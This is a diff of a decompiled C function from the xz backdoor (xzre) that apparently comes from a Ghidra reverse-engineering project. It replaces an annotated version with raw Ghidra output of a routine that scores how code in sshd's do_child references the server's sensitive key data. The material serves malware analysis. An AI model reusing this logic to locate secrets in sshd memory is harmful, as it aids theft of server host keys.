@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/103870_sshd_get_sensitive_data_score_in_do_child.c
 // Function: sshd_get_sensitive_data_score_in_do_child @ 0x103870
-// Calling convention: __stdcall
-// Prototype: int __stdcall sshd_get_sensitive_data_score_in_do_child(void * sensitive_data, elf_info_t * elf, string_references_t * refs)
+// Calling convention: unknown
+// Prototype: undefined sshd_get_sensitive_data_score_in_do_child(void)
 
 
 /*
@@ -13,48 +13,43 @@
 #include "xzre_types.h"
 
 
-int sshd_get_sensitive_data_score_in_do_child
-              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)
+char sshd_get_sensitive_data_score_in_do_child(long param_1,undefined8 param_2,long param_3)
 
 {
-  u8 *code_start;
-  u8 *code_end;
-  BOOL BVar1;
-  long lVar2;
-  u8 **ppuVar3;
-  uint uVar4;
-  byte bVar5;
-  dasm_ctx_t insn_ctx;
-  u8 *do_child_start;
-  u8 *do_child_end;
+  long lVar1;
+  undefined8 uVar2;
+  int iVar3;
+  long lVar4;
+  long *plVar5;
+  char cVar6;
+  byte bVar7;
+  long do_child_start;
+  long do_child_end;
   
-  bVar5 = 0;
-  uVar4 = 0;
-  code_start = (u8 *)refs->entries[1].func_start;
-  if (code_start != (u8 *)0x0) {
-    code_end = (u8 *)refs->entries[1].func_end;
-    BVar1 = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
-    uVar4 = (uint)(BVar1 != FALSE);
-    ppuVar3 = &do_child_start;
-    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
-      *(undefined4 *)ppuVar3 = 0;
-      ppuVar3 = (u8 **)((long)ppuVar3 + (ulong)bVar5 * -8 + 4);
+  bVar7 = 0;
+  cVar6 = '\0';
+  lVar1 = *(long *)(param_3 + 0x28);
+  if (lVar1 != 0) {
+    uVar2 = *(undefined8 *)(param_3 + 0x30);
+    iVar3 = find_instruction_with_mem_operand(lVar1,uVar2,0,param_1);
+    cVar6 = iVar3 != 0;
+    plVar5 = &do_child_start;
+    for (lVar4 = 0x16; lVar4 != 0; lVar4 = lVar4 + -1) {
+      *(undefined4 *)plVar5 = 0;
+      plVar5 = (long *)((long)plVar5 + (ulong)bVar7 * -8 + 4);
     }
-    BVar1 = find_instruction_with_mem_operand
-                      (code_start,code_end,(dasm_ctx_t *)&do_child_start,
-                       (void *)((long)sensitive_data + 0x10));
-    if (BVar1 != FALSE) {
-      BVar1 = find_instruction_with_mem_operand
-                        (do_child_end + (long)do_child_start,code_end,(dasm_ctx_t *)0x0,
-                         (void *)((long)sensitive_data + 0x10));
-      if (BVar1 == FALSE) {
-        uVar4 = uVar4 + 1;
+    iVar3 = find_instruction_with_mem_operand(lVar1,uVar2,&do_child_start,param_1 + 0x10);
+    if (iVar3 != 0) {
+      iVar3 = find_instruction_with_mem_operand
+                        (do_child_end + do_child_start,uVar2,0,param_1 + 0x10);
+      if (iVar3 == 0) {
+        cVar6 = cVar6 + '\x01';
       }
       else {
-        uVar4 = uVar4 + 2;
+        cVar6 = cVar6 + '\x02';
       }
     }
   }
-  return uVar4;
+  return cVar6;
 }
 
